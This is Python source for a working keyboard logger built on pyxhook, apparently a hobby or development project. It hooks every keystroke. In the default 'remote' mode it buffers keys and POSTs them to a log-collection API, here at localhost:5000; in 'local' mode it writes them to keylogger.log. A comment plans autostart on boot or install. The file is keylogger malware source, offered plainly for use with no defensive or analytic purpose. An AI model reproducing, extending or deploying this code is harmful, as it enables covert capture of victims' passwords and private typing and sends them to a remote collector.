#features to implment: autostart up on computer start/install
#defaults to remote option
import sys
from datetime import datetime
import pyxhook
from urllib import urlencode
import urllib2
from pymongo import MongoClient
import requests

class controlKey:
  def __init__(self):
    self.t = datetime.now()
    self.buffer = ''
    self.log_file = 'keylogger.log'

  def OnKeyPressLocal(self, event):
    file_stream = open(self.log_file, 'a')
    # dev purposes only
    if event.Ascii==96: #96 is the ascii value of the grave key (`)
      file_stream.close()
      new_hook.cancel()
      return
    print event.Key
    currentTime = datetime.now()
    delta = currentTime - self.t
    if delta.total_seconds() > 5:
      print 'making a new line'
      file_stream.write('\n')
    self.t = currentTime
    file_stream.write(event.Key)

  def OnKeyPressRemote(self, event):
    # dev purposes only
    if event.Ascii==96: #96 is the ascii value of the grave key (`)
      new_hook.cancel()
      return
    currentTime = datetime.now()
    delta = currentTime - self.t
    self.buffer += event.Key
    self.t = currentTime
    if delta.total_seconds() > 5:
      print 'clearing buffer' + self.buffer
      requests.post('http://localhost:5000/api/logs', json={"data": self.buffer})
      self.buffer = ''


ControlKey = controlKey()
new_hook=pyxhook.HookManager()
if len(sys.argv) == 2 and sys.argv[1] == 'local':
  new_hook.KeyDown=ControlKey.OnKeyPressLocal
else:
  new_hook.KeyDown=ControlKey.OnKeyPressRemote
new_hook.HookKeyboard()
new_hook.start()